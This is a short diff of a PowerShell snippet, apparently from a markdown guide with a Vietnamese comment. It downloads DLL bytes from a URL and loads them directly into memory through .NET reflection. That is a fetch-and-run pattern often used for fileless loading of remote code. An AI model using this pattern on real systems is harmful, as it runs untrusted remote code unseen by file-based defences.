@@ -10,5 +10,5 @@ $webClient = New-Object System.Net.WebClient
 $dllBytes = $webClient.DownloadData($url)
 
 # Load assembly từ byte array
-$assembly = [System.Reflection.Assembly]::Load($dllBytes)
+[System.Reflection.Assembly]::Load($dllBytes)
 ```
